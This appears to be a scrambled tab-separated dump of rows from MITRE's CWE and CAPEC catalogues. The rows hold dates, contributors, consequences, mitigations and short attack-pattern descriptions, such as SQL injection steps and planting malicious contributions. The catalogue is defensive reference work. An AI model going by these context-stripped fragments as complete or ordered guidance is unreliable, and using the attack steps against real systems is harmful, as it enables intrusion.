23616	28	CWE Content Team
24165	39	2012-05-11
9786	94	Reveals IMSI and IMEI for tracking of retransmission device and enables further follow-on attacks by revealing black network control messages. (e.g., revealing IP addresses of enterprise servers for VOIP connectivity)
13650	35	MITRE
16761	79	Authorization
16413	39	2012-05-11
9713	39	2012-05-11
11448	55	CAPEC Content Team
14164	51	2014-06-23
19880	81	Confidentiality
20956	79	Access Control
6364	28	Eric Dalci
21259	104	333
8819	46	A common development practice is to add "back door" code specifically designed for debugging or testing purposes that is not intended to be shipped or deployed with the application. These back door entry points create security risks because they are not considered during design or testing and fall outside of the expected operating conditions of the application.
11328	28	CWE Content Team
23389	31	1000
8493	61	Stable
20457	51	2014-06-23
14892	28	CWE Content Team
11185	28	Eric Dalci
8996	62	updated Modes_of_Introduction, Relationships
24622	77	Manual Static Analysis - Binary or Bytecode
7232	21	CWE Content Team
18554	39	2008-11-24
16528	23	An attacker obstructs the interactions between system components. By interrupting or disabling these interactions, an adversary can often force the system into a degraded state or even to fail.
7901	61	Draft
10776	62	updated Potential_Mitigations
13119	39	2010-02-16
21093	63	Bypass Protection Mechanism
13283	86	http://krebsonsecurity.com/2012/06/how-companies-can-beef-up-password-security/
15649	103	Primary
22341	35	MITRE
6473	72	The source of an attack will be difficult or impossible to determine. This can allow attacks to the system to continue without notice.
15681	88	Insufficient Entropy in PRNG
23418	28	CWE Content Team
22643	31	1000
16230	35	MITRE
9119	26	Implementation
11150	26	Implementation
11929	28	CWE Content Team
15653	50	Implementation: Perform testing such as pen-testing and vulnerability scanning to identify directories, programs, and interfaces that grant direct access to executables.
20939	61	Draft
17011	62	updated Relationships
18397	23	An attacker leverages a weakness present in the database access layer code generated with an Object Relational Mapping (ORM) tool or a weakness in the way that a developer used a persistence framework to inject his or her own SQL commands to be executed against the underlying database. The attack here is similar to plain SQL injection, except that the application does not use JDBC to directly talk to the database, but instead it uses a data access layer generated by an ORM tool or framework (e.g. Hibernate). While most of the time code generated by an ORM tool contains safe access methods that are immune to SQL injection, sometimes either due to some weakness in the generated code or due to the fact that the developer failed to use the generated access methods properly, SQL injection is still possible.
13421	91	Architecture and Design
9050	35	MITRE
18710	62	updated Potential_Mitigations, Time_of_Introduction
15075	21	PLOVER
25113	74	1
6061	42	Make sure your API's are stable before you use them in production code.
9972	62	updated Common_Consequences, Relationships, Taxonomy_Mappings
12212	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
21028	28	CWE Content Team
10608	21	Anonymous Tool Vendor (under NDA)
22598	62	updated Description, Other_Notes, Potential_Mitigations
9857	31	1000
15676	81	Integrity
22203	100	The MITRE Corporation
12410	52	CSRF is currently difficult to detect reliably using automated techniques. This is because each application has its own implicit security policy that dictates which requests can be influenced by an outsider and automatically performed on behalf of a user, versus which requests require strong confidence that the user intends to make the request. For example, a keyword search of the public portion of a web site is typically expected to be encoded within a link that can be launched automatically when the user clicks on the link.
24714	63	DoS: Crash, Exit, or Restart
7675	35	MITRE
18847	69	Draft
18306	35	MITRE
12958	67	Medium
11814	39	2010-12-13
17769	84	09
24000	35	MITRE
23249	45	Variant
19768	62	updated Observed_Examples
13622	35	MITRE
6241	56	PeerOf
22034	28	CWE Content Team
7556	35	MITRE
20586	53	The MITRE Corporation
11433	69	Draft
8244	35	Cigital
17206	26	Architecture and Design
14330	79	Integrity
20657	72	The confidentiality of sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.
13854	26	Implementation
19393	74	4
19623	35	MITRE
17279	77	Automated Dynamic Analysis
15184	62	updated Relationships, Taxonomy_Mappings
24998	31	1000
15970	63	Other
7066	35	MITRE
8022	35	MITRE
7225	28	CWE Content Team
13448	86	http://www.faqs.org/faqs/cryptography-faq/snake-oil/
23166	44	SOAR Partial
13830	103	Primary
6465	55	CAPEC Content Team
7783	81	Confidentiality
23285	39	2012-05-11
10236	76	2017-05-01
24708	28	Eric Dalci
10047	51	2014-06-23
20486	21	PLOVER
17822	77	Black Box
21562	60	14
13918	77	Dynamic Analysis with Manual Results Interpretation
6853	57	Primary
14872	50	An organization should provide regular, robust cybersecurity training to its employees to prevent social engineering attacks.
22699	62	updated Potential_Mitigations
15036	39	2009-07-27
9596	28	CWE Content Team
6173	24	Cigital
13569	39	2008-11-24
6337	23	A feature, API, or function being used by a product behaves differently than the product expects.
11351	35	MITRE
13906	103	Primary
15163	62	updated Relationships, Taxonomy_Mappings
17430	56	CanPrecede
16674	39	2014-07-30
11866	56	ChildOf
5912	31	699
20968	76	2015-11-09
15174	35	MITRE
20424	39	2011-06-01
15691	42	The choice could be made to use a language that is not susceptible to these issues.
23513	53	The MITRE Corporation
19056	28	CWE Content Team
21391	39	2011-09-13
10520	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Focused Manual Spotcheck - Focused manual analysis of source                            Manual Source Code Review (not inspections)
18542	39	2014-07-30
16346	28	CWE Content Team
15505	35	MITRE
22136	31	1000
15603	91	Implementation
20876	63	Quality Degradation
6295	31	699
6210	31	1000
16042	69	Draft
22445	42	Use a vetted library or framework that does not allow this weakness to occur or provides constructs that make this weakness easier to avoid.                   For example, consider using authorization frameworks such as the JAAS Authorization Framework [REF-233] and the OWASP ESAPI Access Control feature [REF-45].
12117	39	2017-11-08
20798	35	MITRE
22969	62	updated Relationships
23254	99	Addison Wesley
11884	34	REALIZATION: This weakness is caused during implementation of an architectural security tactic.
14699	100	The MITRE Corporation
21907	91	Implementation
19971	28	CWE Content Team
8051	23	An attack of this type exploits a Web server's decision to take action based on filename or file extension. Because different file types are handled by different server processes, misclassification may force the Web server to take unexpected action, or expected actions in an unexpected sequence. This may cause the server to exhaust resources, supply debug or system data to the attacker, or bind an attacker to a remote process. This type of vulnerability has been found in many widely used servers including IIS, Lotus Domino, and Orion. The attacker's job in this case is straightforward, standard communication protocols and methods are used and are generally appended with malicious information at the tail end of an otherwise legitimate request. The attack payload varies, but it could be special characters like a period or simply appending a tag that has a special meaning for operations on the server side like .jsp for a java application server. The essence of this attack is that the attacker deceives the server into executing functionality based on the name of the request, i.e. login.jsp, not the contents.
21778	46	Some authentication mechanisms rely on the client to generate the hash for a password, possibly to reduce load on the server or avoid sending the password across the network. However, when the client is used to generate the hash, an attacker can bypass the authentication by obtaining a copy of the hash, e.g. by using SQL injection to compromise a database of authentication credentials, or by exploiting an information exposure. The attacker could then use a modified client to replay the stolen hash without having knowledge of the original password.             As a result, the server-side comparison against a client-side hash does not provide any more security than the use of passwords without hashing.
22891	28	CWE Content Team
22281	101	CAPEC Content Team
15905	28	CWE Content Team
13735	42	Use an application firewall that can detect attacks against this weakness. It can be beneficial in cases in which the code cannot be fixed (because it is controlled by a third party), as an emergency prevention measure while more comprehensive software assurance measures are applied, or to provide defense in depth.
17189	62	updated Applicable_Platforms, Relationships, Taxonomy_Mappings, Weakness_Ordinalities
12839	62	updated Relationships
22898	39	2009-05-27
14141	28	CWE Content Team
25149	100	The MITRE Corporation
11640	63	DoS: Crash, Exit, or Restart
22003	56	ChildOf
22984	91	Operation
24335	35	MITRE
14124	67	High
23599	62	updated Potential_Mitigations, Time_of_Introduction
21520	56	CanPrecede
12721	92	Explore
5635	62	updated Related_Attack_Patterns
15531	57	Primary
18216	104	1051
7640	21	PLOVER
7454	62	updated Relationships
16740	31	1000
21578	56	ChildOf
15100	62	updated Applicable_Platforms
13754	104	834
5604	62	updated Description, Relationships, Other_Notes, Taxonomy_Mappings
24815	56	ChildOf
18900	78	High
22338	26	Operation
21084	62	updated Relationships, Relationship_Notes, Taxonomy_Mappings
24643	54	High
19554	31	699
20638	62	updated Relationships
8072	51	2015-11-09
13870	62	updated Common_Consequences, Description
24435	97	DNS Cache Poisoning
10570	39	2008-07-01
25047	28	CWE Content Team
19790	55	CAPEC Content Team
11719	103	Primary
7678	56	ChildOf
12941	89	Standard
21915	62	updated Taxonomy_Mappings
17208	104	572
10211	80	This attack can get sophisticated since the attack may use cryptography.
16904	47	Gain Privileges
23494	45	Base
22694	24	MITRE
14814	23	The software or the administrator places a user into an incorrect group.
6160	28	CWE Content Team
16719	39	2017-11-08
16947	62	updated Relationships, Taxonomy_Mappings
21308	35	MITRE
9431	103	Primary
22036	30	Marianne Swanson
19249	70	Secure Programming for Linux and Unix HOWTO
5809	28	CWE Content Team
17662	91	Architecture and Design
6405	40	The back-end mail server must not be adequately secured against receiving malicious commands from the web-mail server.
14521	56	ChildOf
11502	103	Primary
19065	100	The MITRE Corporation
25290	104	260
18136	35	MITRE
22040	40	The target application must allow the attacker to provide some or all of the arguments to one of these script interpretation methods and must fail to adequately filter these arguments for dangerous or unwanted script commands.
19353	72	A user can assume the identity of another user with separate privileges in another context. This will give the user unauthorized access that may allow them to acquire the access information of other users.
15750	78	Medium
25411	73	Use modified client (modified by reverse engineering)
22774	102	ChildOf
5982	81	Other
15125	39	2014-07-30
14234	79	Availability
25363	79	Confidentiality
13333	59	Updated Related_Weaknesses
17520	95	[Execute the malicious contribution plan] Write the code to be contributed based on the plan and then submit the contribution. Multiple commits, possibly using multiple identities, will help obscure the attack. Monitor the contribution site to try to determine if the code has been uploaded to the target system.
17757	32	The Web Application Security Consortium (WASC)
8340	61	Stable
13540	56	ChildOf
11086	36	https://excess-xss.com/
11755	91	Implementation
18900	40	Session identifiers that remain unchanged when the privilege levels change.
23278	39	2017-11-08
8342	39	2014-07-30
9919	52	Manual static analysis may be effective in detecting the use of custom permissions models and functions. The code could then be examined to identifying usage of the related functions. Then the human analyst could evaluate permission assignments in the context of the intended security model of the software.
23695	35	MITRE
14554	28	CWE Content Team
12431	39	2011-06-01
12795	39	2019-09-19
13193	90	C++
6498	56	ChildOf
23733	62	updated Related_Attack_Patterns, Relationships
20203	39	2009-10-29
7913	28	CWE Content Team
22802	51	2014-06-23
17907	63	DoS: Resource Consumption (CPU)
12322	39	2012-05-11
12233	89	Meta
18717	63	Bypass Protection Mechanism
11935	62	updated Potential_Mitigations, Time_of_Introduction
25352	39	2008-07-01
16090	33	Michael Howard
15306	63	Modify Files or Directories
8407	23	The software constructs all or part of a code segment using externally-influenced input from an upstream component, but it does not neutralize or incorrectly neutralizes special elements that could modify the syntax or behavior of the intended code segment.
17784	35	MITRE
9251	91	Implementation
11906	62	updated Potential_Mitigations, References
14565	28	CWE Content Team
13919	55	CAPEC Content Team
24185	53	The MITRE Corporation
9805	35	MITRE
10390	42	Use different keys for the initiator and responder or of a different type of challenge for the initiator and responder.
6659	103	Primary
7084	55	CAPEC Content Team
21712	62	updated Common_Consequences
22320	28	CWE Content Team
18860	56	ChildOf
17961	35	MITRE
24267	80	Exploiting a client side vulnerability to inject malicious scripts into the browser's executable process.
21934	47	Execute Unauthorized Commands
23469	100	The MITRE Corporation
7583	45	Variant
16379	40	A client program connecting to a web service can read the WSDL to determine what functions are available on the server.
19794	63	Modify Memory
15821	28	CWE Content Team
19619	35	MITRE
6513	90	C++
15799	62	updated Other_Notes
19604	103	Primary
17705	39	2017-05-03
7708	28	CWE Content Team
18542	35	MITRE
11968	31	1000
19724	35	Cigital
19938	103	Primary
20692	73	Use a packet sniffer to capture and record network traffic
22997	81	Integrity
8218	67	Medium
20404	35	Cigital
16473	26	Architecture and Design
15224	43	Simple
22092	69	Incomplete
19151	28	Eric Dalci
6082	62	updated Relationships
11268	63	Read Application Data
19973	62	updated Background_Details, Demonstrative_Examples, Description, Name, Relationships
18628	35	MITRE
14969	100	The MITRE Corporation
9533	56	ChildOf
9536	35	MITRE
24556	63	Bypass Protection Mechanism
9573	39	2009-01-12
16382	66	Cross-Site Request Forgeries (Re: The Dangers of Allowing Users to Post Images)
18743	69	Draft
24695	89	Detailed
10165	62	updated Applicable_Platforms
23401	35	MITRE
16568	74	2
20730	73	Develop malicious PHP script that is injected through vectors identified during the Experiment Phase and executed by the application server to execute a custom PHP script.
21200	35	MITRE
9506	33	John Viega
15279	94	Run Arbitrary Code
14105	103	Primary
9179	43	Simple
23317	39	2012-10-30
13780	81	Access Control
13246	39	2017-11-08
9558	39	2008-09-08
10820	81	Integrity
12349	39	2008-09-08
10337	53	The MITRE Corporation
7756	39	2012-10-30
10713	81	Integrity
7964	21	CWE Content Team
16965	28	CWE Content Team
24678	33	Microsoft
14483	28	CWE Content Team
22448	62	updated Common_Consequences
22804	62	updated Relationships
14185	39	2009-01-12
8264	80	This attack can be as simple as adding extra characters to the logged data (e.g. username). Adding entries is typically easier than removing entries.
14245	35	MITRE
18907	28	CWE Content Team
9696	28	CWE Content Team
12315	26	Architecture and Design
21180	35	MITRE
15846	52	According to SOAR, the following detection techniques may be useful:                                         Cost effective for partial coverage:                                                                           Source code Weakness Analyzer                            Context-configured Source Code Weakness Analyzer
22719	103	Primary
11058	39	2011-06-01
24528	62	updated Relationships, Other_Notes
8908	86	https://buildsecurityin.us-cert.gov/daisy/bsi/articles/knowledge/principles/358.html
18477	21	CLASP
20111	39	2014-07-30
7919	72	Other applications, possibly untrusted, can launch the Activity.
5814	43	Simple
5640	74	3
15191	68	Checking the return value of the function will typically be sufficient, however beware of race conditions (CWE-362) in a concurrent environment.
15672	28	CWE Content Team
18279	28	CWE Content Team
22355	31	699
20497	35	MITRE
6234	101	CAPEC Content Team
14113	39	2009-07-27
19650	88	Path Equivalence: 'filename/' (Trailing Slash)
23852	28	CWE Content Team
14706	62	updated Common_Consequences, Demonstrative_Examples, Relationships
15806	35	MITRE
12286	47	Gain Privileges
21988	91	Implementation
15788	35	Cigital
19607	62	updated Applicable_Platforms, Description, Observed_Examples, Other_Notes, References
6459	35	MITRE
22378	33	David Wheeler
21567	101	CAPEC Content Team
8751	62	updated Common_Consequences, Relationships
24106	74	2
19586	81	Access Control
11041	45	Variant
13230	26	Implementation
13169	43	Simple
6189	23	A protocol or its implementation supports interaction between multiple actors and allows those actors to negotiate which algorithm should be used as a protection mechanism such as encryption or authentication, but it does not select the strongest algorithm that is available to both parties.
8270	62	updated Relationships, Taxonomy_Mappings
19699	66	Business Logic Flaws
9122	91	Operation
19050	35	Cigital
5915	45	Base
12088	28	CWE Content Team
13334	47	Execute Unauthorized Commands
24170	91	Operation
24995	28	CWE Content Team
16622	28	CWE Content Team
11348	50	Pay attention to the fact that the resource you read from can be a replaced by a Symbolic link. You can do a Symlink check before reading the file and decide that this is not a legitimate way of accessing the resource.
8428	31	1000
22974	28	CWE Content Team
24559	56	ChildOf
11977	62	updated Description, Other_Notes
11156	79	Access Control
20530	39	2009-07-27
21378	28	CWE Content Team
12958	46	When security-critical events are not logged properly, such as a failed login attempt, this can make malicious behavior more difficult to detect and may hinder forensic analysis after an attack succeeds.
9058	28	CWE Content Team
11892	62	updated Relationships
19371	35	MITRE
16347	28	CWE Content Team
17667	62	updated References, Potential_Mitigations, Time_of_Introduction
18224	28	CWE Content Team
13280	42	Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use a whitelist of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does.                   When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if the input is only expected to contain colors such as "red" or "blue."                   Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a blacklist). A blacklist is likely to miss at least one undesirable input, especially if the code's environment changes. This can give attackers enough room to bypass the intended validation. However, blacklists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.
8239	63	Reduce Maintainability
13164	61	Stable
17500	35	MITRE
12444	101	CAPEC Content Team
9770	91	Architecture and Design
19841	52	According to SOAR, the following detection techniques may be useful:                                         Highly cost effective:                                                                           Manual Source Code Review (not inspections)
6458	44	SOAR Partial
9457	27	None: No specialized resources are required to execute this type of attack.
11187	85	24
21322	28	Eric Dalci
10149	35	MITRE
19745	63	Modify Files or Directories
7541	21	PLOVER
19302	56	PeerOf
20835	62	updated Description, Name, Potential_Mitigations
20544	101	CAPEC Content Team
15098	72	When an attacker can control a lock, the program may wait indefinitely until the attacker releases the lock, causing a denial of service to other users of the program. This is especially problematic if there is a blocking operation on the lock.
25379	36	http://www.ietf.org/rfc/rfc2616.txt
14416	21	7 Pernicious Kingdoms
13543	48	07
13394	51	2014-06-23
14859	56	ChildOf
16353	21	PLOVER
23932	39	2017-11-08
8419	28	Eric Dalci
24832	39	2012-10-30
24724	44	High
13101	28	CWE Content Team
13067	55	CAPEC Content Team
14183	63	Gain Privileges or Assume Identity
16698	45	Base
22208	91	System Configuration
8290	62	updated Relationships
22844	21	7 Pernicious Kingdoms
18610	71	2010
6922	62	updated Common_Consequences, Other_Notes
5987	62	updated Description, Name, Relationships, Other_Notes, Taxonomy_Mappings
22176	35	MITRE
17531	81	Integrity
20280	91	Implementation
14192	91	Build and Compilation
22031	79	Integrity
16960	32	Tick Tock Computers, LLC
23283	47	Modify Data
6648	56	ChildOf
10865	81	Access Control
14152	62	updated Demonstrative_Examples
24681	28	CWE Content Team
22683	39	2009-07-17
23506	99	McGraw-Hill Osborne Media
11693	39	2008-07-01
6471	50	The client software should have the latest patches and should be audited for vulnerabilities before being used to communicate with potentially hostile servers.
12830	55	CAPEC Content Team
16793	28	CWE Content Team
12684	62	updated Common_Consequences
17683	89	Detailed
14407	28	CWE Content Team
6555	28	CWE Content Team
11634	25	Low
12384	23	The software implements an authentication technique, but it skips a step that weakens the technique.
13347	28	CWE Content Team
8186	39	2008-07-01
5725	53	The MITRE Corporation
20766	45	Base
9884	59	Updated Resources_Required
21769	28	CWE Content Team
24313	62	updated Relationships, Taxonomy_Mappings
13028	95	The attacker finds that he can inject data to the format string parameter of Syslog().
16433	39	2017-11-08
14259	81	Access Control
15190	39	2011-09-13
13751	72	Sensitive data may be compromised by the use of a broken or risky cryptographic algorithm.
24093	91	Architecture and Design
14434	28	CWE Content Team
14133	96	2018-07-02
12589	56	ChildOf
17036	42	Do not use method names in WSDL that might help an adversary guess names of private methods/resources used by the service.
23725	35	MITRE
23406	69	Incomplete
20511	90	Java
17040	42	Carefully identify which variables can be controlled or influenced by an external user, and consider adopting a naming convention to emphasize when externally modifiable variables are being used. An application should be reluctant to trust variables that have been initialized outside of its trust boundary. Ensure adequate checking is performed when relying on input from outside a trust boundary. Do not allow your application to run with register_globals enabled. If you implement a register_globals emulator, be extremely careful of variable extraction, dynamic evaluation, and similar issues, since weaknesses in your emulation could allow external variable modification to take place even without register_globals.
7223	23	The software accepts XML from an untrusted source but does not validate the XML against the proper schema.
6339	35	Cigital
24216	39	2008-09-08
21940	103	Primary
22971	47	Other
18613	23	The software unlocks a critical resource more times than intended, leading to an unexpected state in the system.
19943	62	updated Common_Consequences
20919	97	TCP 'RST' Flag Checksum Probe
23650	100	The MITRE Corporation
11317	77	Automated Static Analysis
11858	104	1076
14355	35	MITRE
19779	39	2011-06-01
17882	35	MITRE
11534	28	CWE Content Team
21697	63	Read Application Data
7985	62	updated Common_Consequences
8653	48	05
10981	81	Other
21572	101	CAPEC Content Team
19904	26	Operation
9027	97	Manipulate Registry Information
15032	62	updated Description, Other_Notes
11538	39	2009-07-27
21498	59	Updated References, Related_Weaknesses
20942	30	Artem Dinaburg
21956	62	updated Applicable_Platforms, Common_Consequences, Relationships, Other_Notes, References, Relationship_Notes, Taxonomy_Mappings, Terminology_Notes
8908	60	19
20163	28	CWE Content Team
13012	28	CWE Content Team
12138	76	2018-07-31
19562	39	2011-06-01
23853	35	MITRE
25020	39	2010-02-16
23724	31	1000
11652	21	7 Pernicious Kingdoms
21251	76	2019-09-30
13494	28	CWE Content Team
13833	47	Read Data
20097	103	Primary
12350	34	OMISSION: This weakness is caused by missing a security tactic during the architecture and design phase.
17331	55	CAPEC Content Team
17124	39	2008-07-01
5668	39	2011-06-01
21489	42	When copying character arrays or using character manipulation methods, the correct size parameter must be used to account for the null terminator that needs to be added at the end of the array. Some examples of functions susceptible to this weakness in C include strcpy(), strncpy(), strcat(), strncat(), printf(), sprintf(), scanf() and sscanf().
20319	62	updated Description, Name, White_Box_Definitions
22878	62	updated Type
20521	62	updated Relationships
14275	39	2008-07-01
21431	47	Bypass Protection Mechanism
23351	97	Shared Data Manipulation
18463	59	Updated Resources_Required
11027	101	CAPEC Content Team
5986	100	The MITRE Corporation
19670	35	Cigital
19999	42	Access control permissions should be set to prevent reading/writing of sensitive files inside/outside of the web directory.
11005	36	http://getfirebug.com/
24323	28	Eric Dalci
18194	88	Detection of Error Condition Without Action
13084	62	updated Relationships, Taxonomy_Mappings, White_Box_Definitions
22364	91	Operation
12197	28	CWE Content Team
15533	92	Experiment
8777	35	MITRE
17629	31	1000
9856	101	CAPEC Content Team
8131	91	Testing
14299	91	Architecture and Design
20091	28	CWE Content Team
11183	89	Standard
13875	85	128
6914	39	2012-05-11
11265	62	updated Time_of_Introduction
21757	35	MITRE
23652	63	Modify Application Data
14766	36	http://www.cl.cam.ac.uk/~mgk25/unicode.html
19635	102	CanFollow
5658	39	2013-02-21
6182	28	CWE Content Team
17761	62	updated Observed_Examples, Potential_Mitigations
14818	62	updated Common_Consequences
14883	39	2008-07-01
9324	33	Ryan Smith
15598	62	updated Potential_Mitigations, Time_of_Introduction
8024	74	2
11710	100	The MITRE Corporation
16401	46	Many modern coding languages provide developers with input validation frameworks to make the task of input validation easier and less error-prone. These frameworks will automatically check all input against specified criteria and direct execution to error handlers when invalid input is received. The improper use (i.e., an incorrect implementation or missing altogether) of these frameworks is not directly exploitable, but can lead to an exploitable condition if proper input validation is not performed later in the application. Not using provided input validation frameworks can also hurt the maintainability of code as future developers may not recognize the downstream input validation being used in the place of the validation framework.
13117	28	CWE Content Team
6950	104	242
10636	44	SOAR Partial
12715	56	ChildOf
5600	39	2018-03-27
25223	39	2010-09-27
9558	35	MITRE
13312	43	Simple
7809	26	Implementation
22527	59	Updated Related_Attack_Patterns
12261	56	CanPrecede
6908	26	Architecture and Design
23190	77	Manual Dynamic Analysis
21269	62	updated References, Relationships, Taxonomy_Mappings
12598	97	Signature Spoofing by Misrepresentation
8452	62	updated Demonstrative_Examples
7837	39	2009-10-29
19253	92	Explore
19403	35	MITRE
11273	81	Integrity
7049	103	Primary
19673	92	Explore
17682	44	SOAR Partial
16332	44	High
10048	36	https://crypto.stanford.edu/cs155old/cs155-spring08/papers/Session_Riding.pdf
8978	76	2018-07-31
10042	90	C#
23934	54	Medium
6509	96	2018-07-02
22792	62	updated Demonstrative_Examples, Relationships
21460	78	High
5825	39	2014-07-30
9481	63	Modify Application Data
24722	56	CanPrecede
18154	39	2019-01-03
6249	94	A successful schema poisoning attack can compromise the availability of the target system's service by exhausting its available resources.
24538	85	5
16611	95	The adversary now tries to modify the user state contents (possibly blindly if the contents are encrypted or otherwise obfuscated) and observe the effects of this change on the application.
12796	42	Run the application with limited privilege to the underlying operating and file system.
7740	62	updated Demonstrative_Examples
12202	27	The ability to craft custom UDP Packets for use during network reconnaissance. This can be accomplished via the use of a port scanner, or via socket manipulation in a programming or scripting language. Packet injection tools are also useful. It is also necessary to trap ICMP diagnostic messages during this process. Depending upon the method used it may be necessary to sniff the network in order to see the response.
8244	28	Eric Dalci
6831	42	Developers should anticipate that terminators will be injected/removed/manipulated in the input vectors of their software system. Use an appropriate combination of black lists and whitelists to ensure only valid, expected and appropriate input is processed by the system.
25076	31	699
13218	28	CWE Content Team
17999	28	CWE Content Team
10134	62	updated Applicable_Platforms, Likelihood_of_Exploit
25355	47	Execute Unauthorized Commands
7970	59	Updated References
22889	39	2008-07-01
13042	28	Eric Dalci
9273	81	Access Control
20066	40	The target must apply access controls, but incorrectly configure them. However, not all incorrect configurations can be exploited by an attacker. If the incorrect configuration applies too little security to some functionality, then the attacker may be able to exploit it if the access control would be the only thing preventing an attacker's access and it no longer does so. If the incorrect configuration applies too much security, it must prevent legitimate activity and the attacker must be able to force others to require this activity..
19311	90	Language-Independent
11085	39	2008-07-01
12288	89	Standard
14333	59	Updated Related_Attack_Patterns
21129	90	C
14763	31	1000
22945	28	CWE Content Team
22534	35	MITRE
12498	62	updated Relationships, Taxonomy_Mappings
10458	42	Use a well-vetted algorithm that is currently considered to be strong by experts in the field, and select well-tested implementations with adequate length seeds.                   In general, if a pseudo-random number generator is not advertised as being cryptographically secure, then it is probably a statistical PRNG and should not be used in security-sensitive contexts.                   Pseudo-random number generators can produce predictable numbers if the generator is known and the seed can be guessed. A 256-bit seed is a good starting point for producing a "random enough" number.
7371	100	The MITRE Corporation
13824	62	updated Common_Consequences
7718	35	MITRE
9975	39	2014-07-30
16714	28	CWE Content Team
15400	35	MITRE
24928	73	TCP/IP Fingerprinting. The attacker uses various software to make connections or partial connections and observe idiosyncratic responses from the operating system. Using those responses, he attempts to guess the actual operating system.
6290	61	Stable
11907	35	MITRE
15726	28	CWE Content Team
16028	35	Cigital
15459	47	Bypass Protection Mechanism
20842	50	Use adequate length session IDs
17199	39	2013-02-21
16399	62	updated References
12214	25	High
7069	91	Testing
6359	39	2017-05-03
6742	101	CAPEC Content Team
22744	27	For a brute force attack one would need a machine with sufficient CPU, RAM and HD.
19889	35	MITRE
6936	40	The victim has an active session with a target system.
19816	39	2008-11-24
25294	28	CWE Content Team
14401	68	This approach is still susceptible to calculation errors, including issues such as off-by-one errors (CWE-193) and incorrectly calculating buffer lengths (CWE-131).
20123	101	CAPEC Content Team
18188	47	Bypass Protection Mechanism
9244	76	2017-08-04
22357	79	Confidentiality
15027	27	The means by which the adversary intends to place the malicious code on the system dictates the tools required. For example, suppose the adversary wishes to leverage social engineering and convince a legitimate user to open a malicious file attached to a seemingly legitimate email. In this case, the adversary might require a tool capable of wrapping malicious code into an innocuous filetype (e.g., PDF, .doc, etc.)
6794	62	updated Relationships
18965	102	ChildOf
23938	104	434
17626	35	MITRE
23917	42	In PHP, call extract() with options such as EXTR_SKIP and EXTR_PREFIX_ALL; call import_request_variables() with a prefix argument. Note that these capabilities are not present in all PHP versions.
23708	43	Simple
11526	28	CWE Content Team
16674	62	updated Relationships, Taxonomy_Mappings
11458	28	CWE Content Team
9593	62	updated Relationships
15804	39	2008-07-01
6762	79	Access Control
9283	39	2008-09-08
22256	50	Create a strong password policy and ensure that your system enforces this policy.
10321	95	[Hypothesize SQL queries in application]Generated hypotheses regarding the SQL queries in an application. For example, the adversary may hypothesize that his input is passed directly into a query that looks like:                   "SELECT * FROM orders WHERE ordernum = _____"or"SELECT * FROM orders WHERE ordernum IN (_____)"or"SELECT * FROM orders WHERE ordernum in (_____) ORDER BY _____"                   Of course, there are many other possibilities.
18651	91	Implementation
18690	102	ChildOf
10487	39	2014-06-23
22935	86	http://www.owasp.org/index.php/Top_10_2007-A4
22269	31	699
15221	102	ChildOf
21501	43	Simple
9414	70	OWASP Testing Guide
7520	66	Buffer UNDERFLOWS: What do you know about it?
10360	62	updated Demonstrative_Examples
6987	74	5
14554	62	updated Potential_Mitigations, References, Relationships
6252	63	Unexpected State
22540	49	2010
14937	62	updated Observed_Examples
17875	62	updated Common_Consequences, Relationships
13755	21	CWE Content Team
6650	28	CWE Content Team
9137	79	Authorization
22286	54	Medium
11579	61	Draft
11982	62	updated Potential_Mitigations
12352	86	http://lcamtuf.coredump.cx/signals.txt
10881	39	2009-10-29
11869	62	updated Common_Consequences, Other_Notes, Potential_Mitigations
10282	62	updated Relationships
6684	35	MITRE
14467	69	Draft
24806	59	Updated Related_Weaknesses
15140	62	updated Relationships
25396	53	The MITRE Corporation
17004	46	Attackers at the destination may be able to spoof trusted servers to steal data or cause a denial of service.             There are at least two distinct weaknesses that can cause the software to communicate with an unintended destination:                                                If the software allows an attacker to control which destination is specified, then the attacker can cause it to connect to an untrusted or malicious destination. For example, because UDP is a connectionless protocol, UDP packets can be spoofed by specifying a false source address in the packet; when the server receives the packet and sends a reply, it will specify a destination by using the source of the incoming packet - i.e., the false source. The server can then be tricked into sending traffic to the wrong host, which is effective for hiding the real source of an attack and for conducting a distributed denial of service (DDoS). As another example, server-side request forgery (SSRF) and XML External Entity (XXE) can be used to trick a server into making outgoing requests to hosts that cannot be directly accessed by the attacker due to firewall restrictions.                   If the software incorrectly specifies the destination, then an attacker who can control this destination might be able to spoof trusted servers. While the most common occurrence is likely due to misconfiguration by an administrator, this can be resultant from other weaknesses. For example, the software might incorrectly parse an e-mail or IP address and send sensitive data to an unintended destination. As another example, an Android application may use a "sticky broadcast" to communicate with a receiver for a particular application, but since sticky broadcasts can be processed by *any* receiver, this can allow a malicious application to access restricted data that was only intended for a different application.
20030	39	2009-07-17
19712	21	CWE Content Team
14836	39	2009-10-29
11307	56	CanPrecede
7143	62	updated Potential_Mitigations, References
7578	97	Forced Deadlock
25374	102	CanPrecede
8472	79	Confidentiality
23406	43	Simple
12051	39	2017-11-08
20013	46	If the DTD contains a large number of nested or recursive entities, this can lead to explosive growth of data when parsed, causing a denial of service.
9476	58	Nonces are often bundled with a key in a communication exchange to produce a new session key for each exchange.
10106	28	CWE Content Team
14642	28	CWE Content Team
10554	48	07
18291	54	Low
14100	39	2010-02-16
17327	28	CWE Content Team
8058	86	http://www.ddj.com/dept/security/197002914
5707	51	2014-06-23
18148	42	Do not use Sockets when writing EJBs.
17238	101	CAPEC Content Team
7778	35	MITRE
15870	44	SOAR Partial
8631	28	CWE Content Team
22555	62	updated Taxonomy_Mappings
19269	27	Attackers may require tools to craft messages containing their forged credentials, and ability to send HTTP request to a web application.
8220	35	MITRE
10919	62	updated Applicable_Platforms, Functional_Areas
16554	39	2017-01-19
17613	35	MITRE
12797	28	CWE Content Team
11523	35	MITRE
12022	92	Exploit
9853	39	2017-11-08
11538	62	updated Observed_Examples
24862	28	CWE Content Team
21289	39	2011-06-01
12089	28	CWE Content Team
21812	69	Incomplete
6137	30	Silvio Cesare
